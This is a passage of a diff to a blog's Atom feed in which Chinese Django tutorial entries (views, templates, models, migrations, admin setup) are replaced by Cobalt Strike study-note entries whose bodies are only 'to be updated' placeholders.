class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>人物信息<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    &#123;% for people in people_list %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; people.name &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor%&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5、最后实现功能：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/12django_note.png.gif" alt></p><p>6、总结MVT流程</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/13django_note.png" alt></p><ul><li>本次Django学习笔记更新完毕，本次项目源码已上传至我的github，源码链接：<a href="https://github.com/teamssix/Django_study_notes" target="_blank" rel="noopener">https://github.com/teamssix/Django_study_notes</a></li></ul><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考链接：<a href="https://youtu.be/BXyGr9JQVcc" target="_blank" rel="noopener">https://youtu.be/BXyGr9JQVcc</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-案例实现&quot;&gt;&lt;a href=&quot;#0x00-案例实现&quot; class=&quot;headerlink&quot; title=&quot;0x00 案例实现&quot;&gt;&lt;/a&gt;0x00 案例实现&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;创建的项目名称为&lt;code&gt;BookManager&lt;/code&gt;，创建应用名称为&lt;code&gt;Book&lt;/code&gt;，完成&lt;code&gt;图书信息&lt;/code&gt;的维护&lt;/li&gt;
-&lt;li&gt;访问图书信息列表&lt;code&gt;127.0.0.1:8000/booklist&lt;/code&gt;，并且点击每个图书能够跳转到对应图书人物信息界面&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
     
     </summary>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="Django" scheme="https://www.teamssix.com/tags/Django/"/>
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
-    <title>【Django 学习笔记】4、模板</title>
-    <link href="https://www.teamssix.com/year/200301-182831.html"/>
-    <id>https://www.teamssix.com/year/200301-182831.html</id>
-    <published>2020-03-01T10:28:31.000Z</published>
-    <updated>2020-03-01T11:13:52.759Z</updated>
+    <title>【CS学习笔记】27、apple渗透测试手法</title>
+    <link href="https://www.teamssix.com/year/200419-150732.html"/>
+    <id>https://www.teamssix.com/year/200419-150732.html</id>
+    <published>2020-04-19T07:07:32.000Z</published>
+    <updated>2020-04-19T07:22:04.237Z</updated>
     
-    <content type="html"><![CDATA[<p>1、在项目根目录下，创建<code>templates</code>目录，在<code>templates</code>下新建<code>index.html</code>文件，PyCharm将自动生成html的文件内容格式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Book</span><br><span class="line">├── BookManager</span><br><span class="line">└── templates</span><br><span class="line">    └── index.html</span><br></pre></td></tr></table></figure><a id="more"></a><p>2、编辑<code>setting.py</code>文件第58行，修改<code>TEMPLATES</code>内容如下，目的是添加<code>templates</code>路径，好让接下来程序能够找到<code>index.html</code>文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DIRS'</span>: [os.path.join(BASE_DIR,<span class="string">'templates'</span>)],</span><br></pre></td></tr></table></figure><p>3、修改<code>view.py</code>文件如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">context=&#123;</span><br><span class="line"><span class="string">'H1'</span>:<span class="string">'OK!'</span>,</span><br><span class="line"><span class="string">'H2'</span>:<span class="string">'-- By TeamsSix'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> render(request,<span class="string">'index.html'</span>,context)</span><br></pre></td></tr></table></figure><p>4、修改<code>index.html</code>文件如下。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H1</span> <span class="attr">style</span>=<span class="string">"color:red;"</span>&gt;</span>&#123;&#123; H1 &#125;&#125;<span class="tag">&lt;/<span class="name">H1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span> <span class="attr">style</span>=<span class="string">"color:limegreen;"</span>&gt;</span>&#123;&#123; H2 &#125;&#125;<span class="tag">&lt;/<span class="name">H2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5、此时，刷新浏览器。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/10django_note.png" alt></p><p>6、视图与<code>templates</code>的总结</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/11django_note.png" alt></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考链接：</p><p><a href="https://youtu.be/BXyGr9JQVcc" target="_blank" rel="noopener">https://youtu.be/BXyGr9JQVcc</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;1、在项目根目录下，创建&lt;code&gt;templates&lt;/code&gt;目录，在&lt;code&gt;templates&lt;/code&gt;下新建&lt;code&gt;index.html&lt;/code&gt;文件，PyCharm将自动生成html的文件内容格式。&lt;/p&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── Book&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;├── BookManager&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;└── templates&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    └── index.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
     
     </summary>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="Django" scheme="https://www.teamssix.com/tags/Django/"/>
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
-    <title>【Django 学习笔记】3、视图</title>
-    <link href="https://www.teamssix.com/year/200301-182816.html"/>
-    <id>https://www.teamssix.com/year/200301-182816.html</id>
-    <published>2020-03-01T10:28:16.000Z</published>
-    <updated>2020-03-01T11:13:36.852Z</updated>
+    <title>【CS学习笔记】26、杀毒软件</title>
+    <link href="https://www.teamssix.com/year/200419-150726.html"/>
+    <id>https://www.teamssix.com/year/200419-150726.html</id>
+    <published>2020-04-19T07:07:26.000Z</published>
+    <updated>2020-04-19T07:22:00.881Z</updated>
     
-    <content type="html"><![CDATA[<ul><li>后台管理页面搞定之后，就需要做公共页面的访问了</li><li>对于Django的设计框架MVT：<ul><li>用户在URL中请求的是视图</li><li>视图接受请求后进行处理</li><li>然后将处理的结果返回给请求者</li></ul></li><li>使用视图时要进行的两步操作：<ul><li>定义视图</li><li>配置URL</li></ul></li></ul><a id="more"></a><h1 id="0x00-定义视图"><a href="#0x00-定义视图" class="headerlink" title="0x00 定义视图"></a>0x00 定义视图</h1><ul><li>视图就是一个Python函数，被定义在应用的views.py中。</li><li>视图的第一个参数是 <code>HttpRequest</code>类型的对象<code>request</code>，包含了所有请求信息</li><li>视图必须返回<code>HttpResponse</code>对象，包含返回给请求者的响应信息。</li><li>需要导入<code>HttpResponse</code>模块：<code>from django.http import HttpResponse</code></li><li>定义视图函数：响应字符串<code>OK!</code>给客户端</li></ul><p>首先修改<code>views.py</code>文件，添加响应内容，修改后如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BookManager/Book/views.py</span></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line"><span class="keyword">return</span> HttpResponse(<span class="string">'OK!    -- By TeamsSix'</span>)</span><br></pre></td></tr></table></figure><h1 id="0x01、配置URL"><a href="#0x01、配置URL" class="headerlink" title="0x01、配置URL"></a>0x01、配置URL</h1><p>之后再修改<code>urls.py</code>文件，添加<code>path(&#39;&#39;, views.index),</code>，完整的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BookManager/BookManager/urls.py</span></span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> Book <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">path(<span class="string">'admin/'</span>, admin.site.urls),</span><br><span class="line">path(<span class="string">''</span>, views.index),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>此时，当我们访问<code>127.0.0.1:8000</code>的时候，代码运行顺序是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  HttpRequest</span><br><span class="line">↓ ↓ ↓</span><br><span class="line">ROOT_URLCONF = <span class="string">'BookManager.urls'</span><span class="comment"># /BookManager/settings.py</span></span><br><span class="line">↓ ↓ ↓</span><br><span class="line">path(<span class="string">''</span>, views.index),<span class="comment"># /BookManager/urls.py</span></span><br><span class="line">↓ ↓ ↓</span><br><span class="line"><span class="keyword">return</span> HttpResponse(<span class="string">'OK!    -- By TeamsSix'</span>)<span class="comment"># /Book/views.py</span></span><br><span class="line">↓ ↓ ↓</span><br><span class="line">      HttpResponse</span><br></pre></td></tr></table></figure><p>最终，浏览器将顺利返回我们的<code>HttpResponse</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/9django_note.png" alt></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考链接：</p><p><a href="https://youtu.be/BXyGr9JQVcc" target="_blank" rel="noopener">https://youtu.be/BXyGr9JQVcc</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;后台管理页面搞定之后，就需要做公共页面的访问了&lt;/li&gt;
-&lt;li&gt;对于Django的设计框架MVT：&lt;ul&gt;
-&lt;li&gt;用户在URL中请求的是视图&lt;/li&gt;
-&lt;li&gt;视图接受请求后进行处理&lt;/li&gt;
-&lt;li&gt;然后将处理的结果返回给请求者&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;使用视图时要进行的两步操作：&lt;ul&gt;
-&lt;li&gt;定义视图&lt;/li&gt;
-&lt;li&gt;配置URL&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
     
     </summary>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="Django" scheme="https://www.teamssix.com/tags/Django/"/>
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
-    <title>【Django 学习笔记】2、模型</title>
-    <link href="https://www.teamssix.com/year/200229-223431.html"/>
-    <id>https://www.teamssix.com/year/200229-223431.html</id>
-    <published>2020-02-29T14:34:31.000Z</published>
-    <updated>2020-02-29T14:57:59.395Z</updated>
+    <title>【CS学习笔记】25、邮件防御</title>
+    <link href="https://www.teamssix.com/year/200419-150719.html"/>
+    <id>https://www.teamssix.com/year/200419-150719.html</id>
+    <published>2020-04-19T07:07:19.000Z</published>
+    <updated>2020-04-19T07:21:57.175Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="0x00-模型"><a href="#0x00-模型" class="headerlink" title="0x00 模型"></a>0x00 模型</h1><ul><li><p>当前项目的开发, 都是数据驱动的。</p></li><li><p>使用Django进行数据库开发的提示 ：</p><ul><li><code>MVT</code>设计模式中的<code>Model</code>, 专门负责和数据库交互.对应<code>(models.py)</code></li><li>由于<code>Model</code>中内嵌了<code>ORM框架</code>, 所以不需要直接面向数据库编程.</li><li>而是定义模型类, 通过<code>模型类和对象</code>完成数据库表的<code>增删改查</code>.</li><li><code>ORM框架</code>就是把数据库表的行与相应的对象建立关联, 互相转换.使得数据库的操作面向对象.</li></ul></li><li><p>使用Django进行数据库开发的步骤 ：</p><ol><li>定义模型类</li><li>模型迁移</li><li>操作数据库</li></ol></li></ul><a id="more"></a><h2 id="1、定义模型类"><a href="#1、定义模型类" class="headerlink" title="1、定义模型类"></a>1、定义模型类</h2><p>在这之前需要先设计数据库的表什么的，这里就不详细的说了（主要是我太懒了，手动狗头），感兴趣的可以看本文的参考链接，下面直接贴定义模型类的代码.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BookManager/Book/models.py</span></span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookInfo</span><span class="params">(models.Model)</span>:</span>  <span class="comment"># 定义数据信息类模型</span></span><br><span class="line">name = models.CharField(max_length=<span class="number">10</span>)  <span class="comment"># 设计name属性</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PeopleInfo</span><span class="params">(models.Model)</span>:</span>  <span class="comment"># 定义人物信息类模型</span></span><br><span class="line">name = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line">gender = models.BooleanField()</span><br><span class="line">book = models.ForeignKey(BookInfo)</span><br></pre></td></tr></table></figure><h2 id="2、模型迁移"><a href="#2、模型迁移" class="headerlink" title="2、模型迁移"></a>2、模型迁移</h2><p>由两步完成，首先生成迁移文件，根据模型类生成创建表的语句；接下来执行迁移，根据第一步生成的语句在数据库中创建表。分别由以下两句完成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py makemigrations</span><br><span class="line">python3 manage.py migrate</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BookManager/ &gt; python3 manage.py makemigrations</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"manage.py"</span>, line 21, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">………内容太多，此处省略………</span><br><span class="line">TypeError: __init__() missing 1 required positional argument: <span class="string">'on_delete'</span></span><br></pre></td></tr></table></figure><p>在运行第一个命令的时候报错了，此时只需要修改定义外键的那行代码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原来的</span></span><br><span class="line">book = models.ForeignKey(BookInfo)</span><br><span class="line"><span class="comment">#修改后</span></span><br><span class="line">book = models.ForeignKey(BookInfo,on_delete=models.CASCADE)</span><br></pre></td></tr></table></figure><p>发生这个错误的原因是由于我看的教程使用的是1.8版本的Django，而我安装的是3.0，Django在2.0版本后，如果定义外键就需要加上<code>on_delete</code>选项了，OK，接下来，继续运行这两个代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BookManager/ &gt; python3 manage.py makemigrations</span><br><span class="line">Migrations <span class="keyword">for</span> <span class="string">'Book'</span>:</span><br><span class="line">  Book\migrations\0001_initial.py</span><br><span class="line">    - Create model BookInfo</span><br><span class="line">    - Create model PeopleInfo</span><br><span class="line"></span><br><span class="line">BookManager/ &gt; python3 manage.py migrate</span><br><span class="line">Operations to perform:</span><br><span class="line">  Apply all migrations: Book, admin, auth, contenttypes, sessions</span><br><span class="line">Running migrations:</span><br><span class="line">  Applying Book.0001_initial... OK</span><br><span class="line">………内容太多，此处省略………</span><br><span class="line">  Applying sessions.0001_initial... OK</span><br></pre></td></tr></table></figure><p>到此，将主目录下生成的<code>db.sqlite3</code>文件拖拽到Database窗口中即可，如果没有Database的窗口，可以用Pycharm专业版试试。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/4django_note.png" alt></p><h1 id="0x01-站点管理"><a href="#0x01-站点管理" class="headerlink" title="0x01 站点管理"></a>0x01 站点管理</h1><ul><li>站点分为内容发布和公共访问两部分。</li><li>使用django站点管理模块步骤：<ul><li>管理界面本地化</li><li>创建管理员</li><li>注册模型类</li><li>自定义站点管理界面</li></ul></li></ul><h2 id="1、管理界面本地化"><a href="#1、管理界面本地化" class="headerlink" title="1、管理界面本地化"></a>1、管理界面本地化</h2><p> 将语言，时间设置为本地的语言时间，大陆使用的<code>简体中文</code>，时区使用<code>亚洲/上海</code>时区，修改<code>settings.py</code>文件。</p><blockquote><p>ps：为什么是上海时区，而不是北京时区？可能老外感觉上海才是国际大都市，北京只是二三线城市，毕竟老外对中国的印象都是陆家嘴而不是天安门（道听途说，不要当真，嘿嘿）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BookManager/BookManager/settings.py</span></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-Hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br></pre></td></tr></table></figure><h2 id="2、创建管理员"><a href="#2、创建管理员" class="headerlink" title="2、创建管理员"></a>2、创建管理员</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py createsuperuser</span><br></pre></td></tr></table></figure><p> 运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BookManager/ &gt; python3 manage.py createsuperuser</span><br><span class="line">用户名 (leave blank to use <span class="string">'dora'</span>): <span class="built_in">test</span></span><br><span class="line">电子邮件地址: <span class="built_in">test</span>@test.com</span><br><span class="line">Password:</span><br><span class="line">Password (again):</span><br><span class="line">Superuser created successfully.</span><br></pre></td></tr></table></figure><p>运行服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BookManager/ &gt; python3 manage.py runserver</span><br><span class="line">Watching for file changes with StatReloader</span><br><span class="line">Performing system checks...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">February 29, 2020 - 20:52:43</span><br><span class="line">Django version 3.0.3, using settings &apos;BookManager.settings&apos;</span><br><span class="line">Starting development server at http://127.0.0.1:8000/</span><br><span class="line">Quit the server with CTRL-BREAK.</span><br></pre></td></tr></table></figure><p>运行之后，在浏览器打开 <a href="http://127.0.0.1:8000/admin，使用刚才创建的用户名密码登陆。" target="_blank" rel="noopener">http://127.0.0.1:8000/admin，使用刚才创建的用户名密码登陆。</a></p><h2 id="3、注册模型类"><a href="#3、注册模型类" class="headerlink" title="3、注册模型类"></a>3、注册模型类</h2><p>刚打开管理员界面的时候，只能看到<code>认证和授权</code>管理栏，这时候就需要将模型类注册进去。</p><p>修改<code>admin.py</code>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BookManager/Book/admin.py</span></span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> Book.models <span class="keyword">import</span> BookInfo,PeopleInfo</span><br><span class="line">admin.site.register(BookInfo)</span><br><span class="line">admin.site.register(PeopleInfo)</span><br></pre></td></tr></table></figure><p>刷新浏览器页面，即可看到刚添加的两个模型类。如果页面无法加载，可以看看是不是服务出现异常，如果出现异常，重新启动服务即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/5django_note.png" alt></p><h2 id="4、自定义站点管理界面"><a href="#4、自定义站点管理界面" class="headerlink" title="4、自定义站点管理界面"></a>4、自定义站点管理界面</h2><p>在管理页面中，随便添加点数据，之后会发现书籍的名称都显示成了<code>BookInfo object</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/6django_note.png" alt></p><p>此时，只需要在<code>model.py</code>里的class里添加以下内容即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> self.name</span><br></pre></td></tr></table></figure><p><code>model.py</code>完整的代码就是这个样子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BookManager/Book/models.py</span></span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookInfo</span><span class="params">(models.Model)</span>:</span>  <span class="comment"># 定义数据信息类模型</span></span><br><span class="line">name = models.CharField(max_length=<span class="number">10</span>)  <span class="comment"># 设计name属性</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PeopleInfo</span><span class="params">(models.Model)</span>:</span>  <span class="comment"># 定义人物信息类模型</span></span><br><span class="line">name = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line">gender = models.BooleanField()</span><br><span class="line">book = models.ForeignKey(BookInfo,on_delete=models.CASCADE)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> self.name</span><br></pre></td></tr></table></figure><p>此时，再刷新页面，就可以看到显示正常了，同样 people info 界面也是正常的了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/7_1django_note.png" alt></p><p>但是，这样显示还是不够直观，所以就需要自定义站点管理界面了，接下来修改<code>admin.py</code>页面，添加以下语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PeopleInfoAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">list_display = [<span class="string">'id'</span>, <span class="string">'name'</span>, <span class="string">'gender'</span>, <span 